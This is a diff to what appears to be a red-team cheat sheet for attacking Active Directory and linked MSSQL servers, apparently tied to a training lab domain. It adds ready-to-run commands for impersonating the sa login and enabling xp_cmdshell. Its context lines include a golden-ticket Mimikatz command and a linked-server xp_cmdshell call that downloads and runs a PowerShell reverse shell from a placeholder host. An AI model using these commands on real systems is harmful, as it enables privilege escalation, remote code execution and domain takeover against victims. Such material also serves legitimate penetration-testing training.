@@ -583,7 +583,7 @@ Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<DOMAIN>
 ```
 . .\PowerUpSQL.ps1
 ```
-
+### Check connections
 #### Discovery of SQL instances (SPN scanning)
 ```
 Get-SQLInstanceDomain
@@ -601,16 +601,7 @@ Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded –Verbose
 Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
 ```
 
-#### Audit for issues
-```
-Invoke-SQLAudit -Verbose -Instance <SQL INSTANCE>
-```
-
-#### Check if impersonation is possible
-```
-Invoke-SQLAuditPrivImpersonateLogin -Instance <SQL INSTANCE> -Verbose -Debug -Exploit
-```
-
+### Database links
 #### Search for links to remote servers
 ```
 Get-SQLServerLink -Instance <SQL INSTANCE> -Verbose
@@ -632,11 +623,62 @@ Get-SQLServerLinkCrawl -Instance <SQL INSTANCE> -Query 'exec master..xp_cmdshell
 Get-SQLServerLinkCrawl -Instance <SQL INSTANCE> -Query 'exec master..xp_cmdshell ''whoami''' | Where-Object CustomQuery
 ```
 
-#### Enable xp_cmdshell
+### Audit
+#### Audit for issues
 ```
-Execute(‘sp_configure “xp_cmdshell”,1;reconfigure;’) AT “<sql instance>”
+Invoke-SQLAudit -Verbose -Instance <SQL INSTANCE>
 ```
 
+### Exploitation
+### Impersonation
+#### Check if impersonation is possible
+```
+Invoke-SQLAuditPrivImpersonateLogin -Instance <SQL INSTANCE> -Verbose -Debug -Exploit
+```
+
+#### Check for impersonation through link
+```
+Get-SQLServerLinkCrawl -Instance <INSTANCE> -Verbose -Query 'SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = ''IMPERSONATE'''
+```
+
+#### Check if impersonation is possible
+```
+-- Find users that can be impersonated
+SELECT distinct b.name
+FROM sys.server_permissions a
+INNER JOIN sys.server_principals b
+ON a.grantor_principal_id = b.principal_id
+WHERE a.permission_name = 'IMPERSONATE'
+```
+
+#### Impersonate a user
+- Might be possible to impersonate user a and then user b and then sa!
+```
+-- Verify you are still running as the normal user login
+SELECT SYSTEM_USER
+SELECT IS_SRVROLEMEMBER('sysadmin')
+-- Impersonate the sa login
+EXECUTE AS LOGIN = 'sa'
+-- Verify you are now running as the sa login
+SELECT SYSTEM_USER
+SELECT IS_SRVROLEMEMBER('sysadmin')
+```
+
+#### Enable and run xp_cmdshell
+```
+-- Enable show options
+EXEC sp_configure 'show advanced options',1
+RECONFIGURE
+GO
+-- Enable xp_cmdshell
+EXEC sp_configure 'xp_cmdshell',1
+RECONFIGURE
+GO
+-- Quickly check what the service account is via xp_cmdshell
+EXEC master..xp_cmdshell 'whoami'
+```
+
+### Command execution
 #### Execute commands
 ```
 Get-SQLServerLinkCrawl -Instance <SQL INSTANCE> -Query "exec master..xp_cmdshell 'whoami'"
@@ -653,7 +695,7 @@ select * from openquery("192.168.23.25",'select * from openquery("db-sqlsrv",''s
 Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query "exec master..xp_cmdshell 'Powershell.exe iex (iwr http://xx.xx.xx.xx/Invoke-PowerShellTcp.ps1 -UseBasicParsing);reverse -Reverse -IPAddress xx.xx.xx.xx -Port 4000'"
 ```
 
-### Foreign Security Principals
+## Foreign Security Principals
 - A Foreign Security Principal (FSP) represents a Security Principal in a external forest trust or special identities (like Authenticated Users, Enterprise DCs etc.).
 
 #### Enumerate FSP's
@@ -662,7 +704,7 @@ Find-ForeignGroup -Verbose
 Find-ForeignUser -Verbose
 ```
 
-### ACLS
+## ACLS
 - Access to resources in a forest trust can also be provided without using FSPs using ACLs.
 ```
 Find-InterestingDomainAcl -Domain <TRUST FOREST>
@@ -670,7 +712,7 @@ Find-InterestingDomainAcl -Domain <TRUST FOREST>
 - Abuse ACL to other forest.
 
 
-### Pam Trust
+## Pam Trust
 - PAM trust is usually enabled between a Bastion or Red forest and a production/user forest which it manages. 
 - PAM trust provides the ability to access a forest with high privileges without using credentials of the current forest. Thus, better security for the bastion forest which is much desired.
 -  To achieve the above, Shadow Principals are created in the bastion domain which are then mapped to DA or EA groups SIDs in the production forest.
